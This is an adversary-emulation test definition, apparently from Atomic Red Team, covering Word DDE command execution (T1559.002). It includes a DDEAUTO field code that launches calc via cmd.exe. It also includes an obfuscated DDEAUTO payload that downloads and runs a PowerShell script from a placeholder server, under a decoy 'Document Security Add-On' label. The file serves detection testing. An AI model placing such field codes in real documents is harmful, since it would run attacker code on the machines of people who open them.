@@ -1,0 +1,48 @@
+{
+  "attack_technique": "T1559.002",
+  "display_name": "Inter-Process Communication: Dynamic Data Exchange",
+  "atomic_tests": [
+    {
+      "name": "Execute Commands",
+      "description": "Executes commands via DDE using Microsfot Word",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "manual",
+        "elevation_required": false,
+        "procedure": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n\n\n\n\n\n\n\n<br/>\n<br/>"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "f592ba2a-e9e8-4d62-a459-ef63abd819fd"
+    },
+    {
+      "name": "Execute PowerShell script via Word DDE",
+      "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\""
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "47c21fb6-085e-4b0d-b4d2-26d72c3830b3"
+    },
+    {
+      "name": "DDEAUTO",
+      "description": "TrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "manual",
+        "elevation_required": false,
+        "procedure": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n\n\n\n\n\n\n\n<br/>"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "cf91174c-4e74-414e-bec0-8d60a104d181"
+    }
+  ]
+}
